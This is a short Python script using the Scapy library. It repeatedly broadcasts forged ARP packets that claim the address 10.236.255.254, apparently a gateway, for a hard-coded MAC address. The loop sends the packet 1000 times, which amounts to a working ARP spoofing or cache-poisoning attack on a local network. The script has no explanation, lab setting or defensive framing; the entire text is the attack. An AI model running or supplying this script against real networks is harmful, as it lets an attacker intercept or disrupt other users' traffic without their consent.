from scapy.all import *
import time


p = Ether(dst="ff:ff:ff:ff:ff:ff", src="f8:4d:89:6a:0c:33") / \
    ARP(psrc="10.236.255.254")

for i in range(1000):
    sendp(p)
    time.sleep(0.1)
